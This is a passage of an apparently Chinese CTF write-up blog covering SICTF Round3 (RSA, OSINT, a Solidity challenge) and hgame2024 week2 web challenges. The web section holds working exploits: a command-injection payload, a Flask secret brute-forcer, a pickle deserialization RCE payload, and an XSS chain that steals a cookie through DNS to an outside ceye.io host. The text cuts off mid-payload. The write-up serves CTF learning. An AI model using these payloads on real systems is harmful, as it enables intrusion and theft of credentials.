class="number">60237305053182363686066000860755970543119549460585763366760183023969060529797821398451174145816154329258405143693872729068255155086734217883658806494371105889752598709446068159151166250635558774937924668506271624373871952982906459509904548833567117402267826477728367928385137857800256270428537882088110496684</span></span><br><span class="line">c2 = <span class="number">20563562448902136824882636468952895180253983449339226954738399163341332272571882209784996486250189912121870946577915881638415484043534161071782387358993712918678787398065688999810734189213904693514519594955522460151769479515323049821940285408228055771349670919587560952548876796252634104926367078177733076253</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">a = <span class="number">233</span></span><br><span class="line">b = <span class="number">9527</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">franklinReiter</span>(<span class="params">n,e,c1,c2,a,b</span>):</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = (x)^e - c1</span><br><span class="line">    g2 = (a*x+b)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic() <span class="comment"># </span></span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">m=franklinReiter(n,e,c1,c2,a,b)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># SICTF&#123;45115fb2-84d6-4369-88c2-c8c3d72b4c55&#125;</span></span><br></pre></td></tr></table></figure><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="签到-OSINT签到"><a href="#签到-OSINT签到" class="headerlink" title="[签到]OSINT签到"></a>[签到]OSINT签到</h2><p>百度识图可以看到类似的图片，得到地点为<code>红城湖</code></p><p><img src="/./SICTF_Round3/s_1_1.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SICTF&#123;海南省_海口市_琼山区_红城湖公园&#125;</span><br></pre></td></tr></table></figure><h2 id="树木的压迫"><a href="#树木的压迫" class="headerlink" title="树木的压迫"></a>树木的压迫</h2><p>把红线部分切下来去百度识图，可以知道这是 <code>达州市体育中心</code></p><p><img src="/./SICTF_Round3/s_3_1.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SICTF&#123;四川省_达州市_通川区_凤凰大道376号_达州市体育中心&#125;</span><br></pre></td></tr></table></figure><h2 id="这才是签到"><a href="#这才是签到" class="headerlink" title="这才是签到"></a>这才是签到</h2><p>google识图，可以知道这是在 <strong>意大利的威尼斯</strong>。</p><p><img src="/./SICTF_Round3/s_2_1.png"></p><p><img src="/"></p><p>接着用谷歌地图找 <strong>达涅利酒店</strong>附近，可以找到  <strong>Gondola Danieli</strong></p><p><img src="/./SICTF_Round3/s_2_2.png"></p><p>对着上面图的所有可见地点爆破，可以知道目的地是 <strong>Chiesa di San Zaccaria</strong> （别学</p><p>flag：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SICTF&#123;意大利_威尼斯_GondolaDanieli_ChiesadiSanZaccaria&#125;</span><br></pre></td></tr></table></figure><h2 id="真的签到"><a href="#真的签到" class="headerlink" title="真的签到"></a>真的签到</h2><p>把摩天轮切下来百度识图，可以找到一个 <strong>大信新都汇</strong> 旁边的摩天轮。</p><p><img src="/./SICTF_Round3/s_4_1.png"></p><p>然后根据 <a href="https://www.ixigua.com/6831158277674369550?wid_try=1">这个视频</a> 可以知道是在 <strong>黄杨河</strong>边</p><p><img src="/./SICTF_Round3/s_4_2.png"></p><p>flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SICTF&#123;广东省_珠海市_斗门区_大信新都汇&#125;</span><br></pre></td></tr></table></figure><h1 id="blockchain"><a href="#blockchain" class="headerlink" title="blockchain"></a>blockchain</h1><h2 id="CheckinNewYear"><a href="#CheckinNewYear" class="headerlink" title="CheckinNewYear"></a>CheckinNewYear</h2><p>nc连接，常规124，参考链接：<a href="https://www.bilibili.com/video/BV1Xe4y1e7sQ/?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=abef91c9524f8373b84bcdb481407372">【CTF】区块链–合约题入门操作 区块链题型简介 水龙头的对比 remixIDE的基本使用 1——NewStarCTF</a></p><p>源码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.9</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">HappyNewYear</span>&#123;</span><br><span class="line">    string private <span class="title class_">NewYear</span>;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">string memory _newyear </span>)  &#123;</span><br><span class="line">        <span class="title class_">NewYear</span> = _newyear;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">happyNewYear</span>(<span class="params">string memory _newYear</span>) public payable &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">uint160</span>(msg.<span class="property">sender</span>) |</span><br><span class="line">        <span class="number">2</span>**<span class="number">16</span> * <span class="number">3</span>**<span class="number">3</span> * <span class="number">5</span> * <span class="number">7</span> * <span class="number">13</span> * <span class="number">17</span> * <span class="number">19</span> * <span class="number">37</span> * <span class="number">73</span> * <span class="number">97</span> * <span class="number">109</span> * <span class="number">241</span> * <span class="number">257</span> * <span class="number">433</span> * <span class="number">577</span> * <span class="number">673</span> * <span class="number">38737</span> * <span class="number">487824887233</span> ==</span><br><span class="line">        <span class="number">2</span>**<span class="number">2</span> * <span class="number">17</span> * <span class="number">67</span> * <span class="number">733</span> * <span class="number">316139</span> * <span class="number">18992431891</span> * <span class="number">72887484710091183279372959</span></span><br><span class="line">        ,<span class="string">&quot;Not this Year&quot;</span>);</span><br><span class="line">        <span class="title class_">NewYear</span> = _newYear;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">function</span> <span class="title function_">isSolved</span>(<span class="params"></span>) public view returns (bool)&#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(<span class="title class_">NewYear</span>)) == <span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(<span class="string">&quot;Happy&quot;</span>)),<span class="string">&quot;not HappyNewYear&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>调用<code>happyNewYear</code>给<code>NewYear</code>赋值为<code>Happy</code>就行了，但在赋值之前会对我们的地址进行检查，要求结尾是<code>0x2024</code>。</p><p>那么可以去创建一个后缀是<code>0x2024</code>的虚拟的地址。</p><p>参考链接:<a href="https://www.cnblogs.com/briyctf/p/16753799.html">NewStarCTF Week3 Blockchain </a></p><p>通过 <a href="https://vanity-eth.tk/">这个网站</a> 可以帮助我们获得指定前缀或者后缀的以太地址账号。</p><p>指定后四位为2024，一段时间后得到符合要求的地址，通过私钥导入Metamask</p><p><img src="/./SICTF_Round3/b_1_1.png"></p><p>然后把remix上的账户改成新建的账户，先进行chooseone，待交易完成后给<code>happyNewYear</code>传<code>Happy</code>即可。</p><p>1里面填上攻击地址，2里面填上要传的值，即<code>Happy</code>，最后<code>isSolved</code>即可。</p><p><img src="/./SICTF_Round3/b_1_2.png"></p><p>nc查看3即可得到flag。</p><p><img src="/./SICTF_Round3/b_1_3.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> write up </category>
          
          <category> SICTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> web </tag>
            
            <tag> pwn </tag>
            
            <tag> misc </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame2024_week2 WP</title>
      <link href="/hgame2024_week2/"/>
      <url>/hgame2024_week2/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="What-the-cow-say"><a href="#What-the-cow-say" class="headerlink" title="What the cow say?"></a>What the cow say?</h2><p>尝试  <strong>`ls`</strong> 可以发现能执行命令。</p><p>查看根目录，可以看到<code>flag_is_here</code>目录，查看<code>flag_is_here</code>，可以看到<code>flag_c0w54y</code>。</p><p>过滤了<code>cat</code>，但<code>?</code>没被过滤，可以用<code>/bin/c?t</code>来代替<code>cat</code>查看文件。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user_input=`/bin/c?t /f*/f*`</span><br></pre></td></tr></table></figure><p><img src="/"><img src="/./hgame2024_week2/w_1_1.png" alt="w_1_1"></p><h2 id="myflask"><a href="#myflask" class="headerlink" title="myflask"></a>myflask</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, send_file</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> pytz <span class="keyword">import</span> timezone</span><br><span class="line"></span><br><span class="line">currentDateAndTime = datetime.now(timezone(<span class="string">&#x27;Asia/Shanghai&#x27;</span>))</span><br><span class="line">currentTime = currentDateAndTime.strftime(<span class="string">&quot;%H%M%S&quot;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment"># Tips: Try to crack this first ↓</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = currentTime</span><br><span class="line"><span class="built_in">print</span>(currentTime)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&#x27;app.py&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;There is no session available in your client :(&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;You are &#123;&#125; now&#x27;</span>.<span class="built_in">format</span>(session[<span class="string">&#x27;username&#x27;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># For POST requests from admin</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        pickle_data=base64.b64decode(request.form.get(<span class="string">&#x27;pickle_data&#x27;</span>))</span><br><span class="line">        <span class="comment"># Tips: Here try to trigger RCE</span></span><br><span class="line">        userdata=pickle.loads(pickle_data)</span><br><span class="line">        <span class="keyword">return</span> userdata</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access Denied&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure><p>通过源码，可以知道<code>SECRET_KEY</code>是6位数的纯数字，可以爆破</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> flask_unsign</span><br><span class="line"><span class="keyword">from</span> flask_unsign.helpers <span class="keyword">import</span> wordlist</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;wordlist.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Generating wordlist... &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成爆破字典</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(path,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    [f.write(<span class="string">&quot;&quot;</span>.join(x)+<span class="string">&quot;\n&quot;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> itertools.product(<span class="string">&#x27;0123456789&#x27;</span>, repeat=<span class="number">6</span>)]<span class="comment">#生成条件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#填需要爆破的session</span></span><br><span class="line">cookie_tamper = <span class="string">&quot;eyJ1c2VybmFtZSI6Imd1ZXN0In0.ZcEzTg.YXSvJEMzC1MuPiDKMXDtTXMi3zU&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Got cookie: &quot;</span> + cookie_tamper)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Cracker Started...&quot;</span>)</span><br><span class="line"></span><br><span class="line">obj = flask_unsign.Cracker(value=cookie_tamper)</span><br><span class="line"></span><br><span class="line">before = time.time()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> wordlist(path, parse_lines=<span class="literal">False</span>) <span class="keyword">as</span> iterator:</span><br><span class="line">            obj.crack(iterator)</span><br><span class="line"></span><br><span class="line">secret = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> obj.secret:</span><br><span class="line">    secret = obj.secret.decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Found SECRET_KET <span class="subst">&#123;secret&#125;</span> in <span class="subst">&#123;time.time()-before&#125;</span> seconds&quot;</span>)</span><br><span class="line"></span><br><span class="line">signer = flask_unsign.sign(&#123;<span class="string">&quot;time&quot;</span>:time.time(),<span class="string">&quot;authorized&quot;</span>:<span class="literal">True</span>&#125;,secret=secret)</span><br></pre></td></tr></table></figure><p>得到<code>SECRET_KEY</code>为 <code>155018</code> 。</p><p>接下来是使用 <a href="https://github.com/noraj/flask-session-cookie-manager">flask-session-cookie-manager</a> 来session伪造。</p><p>把伪造后的session放进cookie，访问<code>/flag</code>路由，接着是<code>pickle</code>反序列化。</p><p>没有任何过滤，用<code>__reduce__</code>就行了。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>,))<span class="comment">#popen内输入命令</span></span><br><span class="line">    </span><br><span class="line">a = A()</span><br><span class="line">a = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(a))</span><br><span class="line"><span class="comment"># b&#x27;gASVRgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwqX19pbXBvcnRfXygnb3MnKS5wb3BlbignY2F0IC9mbGFnJykucmVhZCgplIWUUpQu&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week2/w_2_1.png"></p><h2 id="梅开二度"><a href="#梅开二度" class="headerlink" title="梅开二度"></a>梅开二度</h2><p>源码：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;context&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/url&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;regexp&quot;</span></span><br><span class="line"><span class="string">&quot;sync&quot;</span></span><br><span class="line"><span class="string">&quot;text/template&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/chromedp/chromedp&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;golang.org/x/net/html&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> re = regexp.MustCompile(<span class="string">`script|file|on`</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> lock sync.Mutex</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">allocCtx, cancel := chromedp.NewExecAllocator(context.Background(), <span class="built_in">append</span>(chromedp.DefaultExecAllocatorOptions[:],</span><br><span class="line">chromedp.NoSandbox, chromedp.DisableGPU)...)</span><br><span class="line"><span class="keyword">defer</span> cancel()</span><br><span class="line"></span><br><span class="line">r := gin.Default()</span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">tmplStr := c.Query(<span class="string">&quot;tmpl&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> tmplStr == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">tmplStr = defaultTmpl</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> re.MatchString(tmplStr) &#123;</span><br><span class="line">c.String(<span class="number">403</span>, <span class="string">&quot;tmpl contains invalid word&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(tmplStr) &gt; <span class="number">50</span> &#123;</span><br><span class="line">c.String(<span class="number">403</span>, <span class="string">&quot;tmpl is too long&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">tmplStr = html.EscapeString(tmplStr)</span><br><span class="line">&#125;</span><br><span class="line">tmpl, err := template.New(<span class="string">&quot;resp&quot;</span>).Parse(tmplStr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(<span class="number">500</span>, <span class="string">&quot;parse template error: %v&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := tmpl.Execute(c.Writer, c); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(<span class="number">500</span>, <span class="string">&quot;execute template error: %v&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">&quot;/bot&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">rawURL := c.Query(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">u, err := url.Parse(rawURL)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(<span class="number">403</span>, <span class="string">&quot;url is invalid&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> u.Host != <span class="string">&quot;127.0.0.1:8080&quot;</span> &#123;</span><br><span class="line">c.String(<span class="number">403</span>, <span class="string">&quot;host is invalid&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">lock.Lock()</span><br><span class="line"><span class="keyword">defer</span> lock.Unlock()</span><br><span class="line"></span><br><span class="line">ctx, cancel := chromedp.NewContext(allocCtx,</span><br><span class="line">chromedp.WithBrowserOption(chromedp.WithDialTimeout(<span class="number">10</span>*time.Second)),</span><br><span class="line">)</span><br><span class="line"><span class="keyword">defer</span> cancel()</span><br><span class="line">ctx, _ = context.WithTimeout(ctx, <span class="number">20</span>*time.Second)</span><br><span class="line"><span class="keyword">if</span> err := chromedp.Run(ctx,</span><br><span class="line">chromedp.Navigate(u.String()),</span><br><span class="line">chromedp.Sleep(time.Second*<span class="number">10</span>),</span><br><span class="line">); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;bot will visit it.&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">&quot;/flag&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> c.RemoteIP() != <span class="string">&quot;127.0.0.1&quot;</span> &#123;</span><br><span class="line">c.String(<span class="number">403</span>, <span class="string">&quot;you are not localhost&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">flag, err := os.ReadFile(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(<span class="number">500</span>, <span class="string">&quot;read flag error&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.SetCookie(<span class="string">&quot;flag&quot;</span>, <span class="type">string</span>(flag), <span class="number">3600</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">false</span>, <span class="literal">true</span>)</span><br><span class="line">c.Status(<span class="number">200</span>)</span><br><span class="line">&#125;)</span><br><span class="line">r.Run(<span class="string">&quot;:8080&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> defaultTmpl = <span class="string">`</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;YOU ARE&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;div&gt;欢迎来自 &#123;&#123;.RemoteIP&#125;&#125; 的朋友&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div&gt;你的 User-Agent 是 &#123;&#123;.GetHeader &quot;User-Agent&quot;&#125;&#125;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div&gt;flag在bot手上，想办法偷过来&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在<code>/</code> 路由存在ssti，但是go的ssti和其他语言的不太一样，并不能直接rce和读文件，但可以xss。</p><p>先是ssti，<code>tmpl</code>有长度和的<code>html.EscapeString</code>限制，但反引号并不会被 <code>html.EscapeString</code> 转义，因此用反引号代替单双引号。</p><p>调用 <code>Query</code> 函数，把get传进去的变量当成字符串输出出来，此时的输出是原样输出，可以xss。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tmpl=&#123;&#123;.Query `user`&#125;&#125;&amp;user=123</span><br></pre></td></tr></table></figure><p><code>user</code>里填上我们的js代码，实现了xss。</p><p>接着是xss，由源码可以知道，cookie由<code>/flag</code>路由设置，因此在 x 之前要先访问<code>/flag</code>设置好cookie才能把cookie带出来。</p><p>然后是设置cookie的时候</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">c.SetCookie(<span class="string">&quot;flag&quot;</span>, <span class="type">string</span>(flag), <span class="number">3600</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">false</span>, <span class="literal">true</span>)</span><br></pre></td></tr></table></figure><p>这里设置的参数使得我们不能通过用<code>document.cookie</code>来获取cookie，我们需要用别的方法来获取。</p><p>用<code>Cookie</code>函数来获取cookie</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tmpl=&#123;&#123;.Cookie `flag`&#125;&#125;</span><br></pre></td></tr></table></figure><p>访问后会把flag输出到前端页面。</p><p>之后读取前端页面内容，把内容里的东西带出来即可。</p><p>xss的js代码</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&quot;http://127.0.0.1:8080/flag&quot;</span>);<span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:8080/?tmpl=&#123;&#123;.Cookie `flag`&#125;&#125;&#x27;</span>);xhr.<span class="property">withCredentials</span> = <span class="literal">true</span>;xhr.<span class="title function_">send</span>();xhr.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> a=<span class="string">&quot;y&quot;</span>+(xhr.<span class="property">responseText</span>).<span class="title function_">substring</span>(<span class="number">0</span>,<span class="number">4</span>);<span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&quot;http://&quot;</span>+a+<span class="string">&quot;.kbqsag.ceye.io&quot;</span>);&#125;;&#125;,<span class="number">1000</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>先是访问<code>http://127.0.0.1:8080/flag</code>，1s后再访问<code>http://127.0.0.1:8080/</code>用 <code>.Cookie</code> 把flag读出来。（坑1：这里吃了大亏，不等待的话可能会没有cookie，得稍微等待一会）</p><p>之后读出访问<code>http://127.0.0.1:8080/</code>后的页面内容，然后把内容用dns带出来。（坑2：url里有大括号会带不出数据，因此在带出来之前要处理一下数据，不能有大括号。）</p><p>之后就利用<code>/bot</code>路由去xss。（坑3：注意一下url编码，<code>+</code>和<code>;</code>要编码两次，发送给<code>/bot</code>路由的数据有一次url解码，<code>/bot</code>发送给路由的数据也有一次url解码，不进行编码会因为 <code>+</code> 和 <code>;</code> 丢失出现 x 不到的情况）</p><p>先读flag的长度，为后边的截取做准备</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url = http%3A%2F%2F127.0.0.1%3A8080%3Ftmpl%3D%7B%7B.Query%20%60user%60%7D%7D%26user%3D%3Cscript%3Ewindow.open(%22http%3A%2F%2F127.0.0.1%3A8080%2Fflag%22)%253BsetTimeout(function()%7Bvar%20xhr%20%3D%20new%20XMLHttpRequest()%253Bxhr.open(&#x27;GET&#x27;%2C%20&#x27;http%3A%2F%2F127.0.0.1%3A8080%2F%253Ftmpl%253D%257B%257B.Cookie%2520%2560flag%2560%257D%257D&#x27;)%253Bxhr.withCredentials%20%3D%20true%253Bxhr.send()%253Bxhr.onreadystatechange%3Dfunction()%7Bvar%20a%3D%22y%22%252b(xhr.responseText).length%253Bwindow.open(%22http%3A%2F%2F%22%252ba%252b%22.kbqsag.ceye.io%22)%253B%7D%253B%7D%2C1000)%3C%2Fscript%3E</span><br></pre></td></tr></table></figure><p>可以得到flag的长度为<code>48</code>。</p><p><img src="/./hgame2024_week2/w_3_1.png"></p><p>flag的头是<code>hgame</code>或者<code>flag</code>，那先读<code>0~4</code>位验证一下flag头，读出来的是<code>hgam</code>，说明flag头是<code>hgame</code>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url= http%3A%2F%2F127.0.0.1%3A8080%3Ftmpl%3D%7B%7B.Query%20%60user%60%7D%7D%26user%3D%3Cscript%3Ewindow.open(%22http%3A%2F%2F127.0.0.1%3A8080%2Fflag%22)%253BsetTimeout(function()%7Bvar%20xhr%20%3D%20new%20XMLHttpRequest()%253Bxhr.open(&#x27;GET&#x27;%2C%20&#x27;http%3A%2F%2F127.0.0.1%3A8080%2F%253Ftmpl%253D%257B%257B.Cookie%2520%2560flag%2560%257D%257D&#x27;)%253Bxhr.withCredentials%20%3D%20true%253Bxhr.send()%253Bxhr.onreadystatechange%3Dfunction()%7Bvar%20a%3D%22y%22%252b(xhr.responseText).substring(0%2C4)%253Bwindow.open(%22http%3A%2F%2F%22%252ba%252b%22.kbqsag.ceye.io%22)%253B%7D%253B%7D%2C1000)%3C%2Fscript%3E</span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week2/w_3_2.png"></p><p>接着读 <code>6~46</code>位，即把flag大括号内的内容读出来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url= 